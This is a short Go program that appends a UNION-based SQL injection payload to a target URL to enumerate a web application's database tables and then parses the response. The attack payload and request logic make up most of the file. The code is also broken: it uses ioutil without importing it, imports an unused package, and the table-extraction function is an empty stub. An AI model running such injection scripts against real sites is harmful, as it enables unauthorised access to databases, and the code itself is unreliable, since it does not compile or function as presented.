package main

import (
	"fmt"
	"net/http"
	"strings"
)

func detectTables(url string) []string {
	tables := []string{}
	payload := "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- "
	target := fmt.Sprintf("%s%s", url, payload)

	resp, err := http.Get(target)
	if err != nil {
		fmt.Println("Error making request:", err)
		return tables
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		bodyBytes, _ := ioutil.ReadAll(resp.Body)
		bodyString := string(bodyBytes)
		tables = extractTables(bodyString)
	}

	return tables
}

func extractTables(responseBody string) []string {
	tables := []string{}
	// Logika ekstraksi tabel sederhana dari responseBody
	return tables
}
